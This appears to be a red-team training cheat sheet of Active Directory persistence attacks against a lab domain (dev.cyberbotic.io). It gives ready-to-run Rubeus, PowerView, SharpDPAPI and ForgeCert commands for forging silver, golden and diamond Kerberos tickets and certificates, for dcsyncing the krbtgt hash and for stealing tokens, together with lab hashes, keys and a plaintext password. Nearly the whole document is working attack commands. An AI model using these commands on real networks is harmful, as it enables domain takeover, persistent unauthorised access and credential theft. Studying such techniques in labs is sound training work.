TO GET SID RUN THE FOLLOWING And remove the last 4 numbers
```bash
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
powershell Get-DomainUser -Identity nlamb -Properties objectsid
```

# Silver ticket

```bash
# Create a ticket with a found NTLM or ESK256 on attacker machine
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

# In one of the compromised machines use that ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
steal_token 5668

# If currently as NT Authority, steal token from running process to execute the command
ps -> steal_token 1234
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
rev2self
steal_token <ticket-pid>

```

---

# Golden ticket

```bash
# dcsync to get krbtgt hash
make_token DEV\nlamb F3rrari
dcsync dev.cyberbotic.io DEV\krbtgt

# Use hash to forge a golden ticket on attacker machine
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /rc4:9fb924c244ad44e934c390dc17e02c3d /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doI[...]Rnpxrp187zg//==
steal_token <ticket-pid>
```

---

# Diamond ticket

```bash
# Create a ticket on the compromised machine
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

# Describe the ticket to make sure that is for that user
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

# If correct, use the ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doI[...]Rnpxrp187zg//==
steal_token <ticket-pid>
```

---

# Forged Certificates
```bash
# Run in DC
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

# Save the private key and certificate to a .pem file and convert it to a .pfx with openssl (in attacker machine)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Forge ticket with ForgeCert (in attacker machine)
C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath .\Desktop\sub-ca.pfx --CaCertPassword pass123 --Subject "CN=User" --SubjectAltName "nlamb@cyberbotic.io" --NewCertPath .\Desktop\fake.pfx --NewCertPassword pass123

# User the certifcate to ask for TGT (in beacon)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIACAQ[...snip...]IEAAAA /password:pass123 /nowrap
```
